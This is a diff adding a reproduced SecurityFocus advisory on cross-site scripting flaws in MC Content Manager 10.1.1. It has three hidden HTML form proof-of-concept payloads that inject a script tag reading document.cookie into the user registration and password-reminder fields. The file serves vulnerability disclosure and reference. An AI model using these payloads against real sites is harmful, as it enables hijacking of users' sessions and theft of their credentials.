@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/47014/info
+
+MC Content Manager is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+MC Content Manager 10.1.1 is vulnerable; other versions may also be affected. 
+
+<form name="hack" action="http://www.example.com/?module=users" method="post">
+<input type="hidden" name="module" value="users">
+<input type="hidden" name="action" value="remind">
+<input type="hidden" name="user_email" value='"><script>alert(document.cookie)</script>'>
+</form>
+
+<form name="hack" action="http://www.example.com/?module=users" method="post">
+<input type="hidden" name="module" value="users">
+<input type="hidden" name="action" value="register">
+<input type="hidden" name="user_email" value='"><script>alert(document.cookie)</script>'>
+</form>
+
+<form name="hack" action="http://www.example.com/?module=users" method="post">
+<input type="hidden" name="module" value="users">
+<input type="hidden" name="action" value="register">
+<input type="hidden" name="user_hide" value='"><script>alert(document.cookie)</script>'>
+</form>
+
+
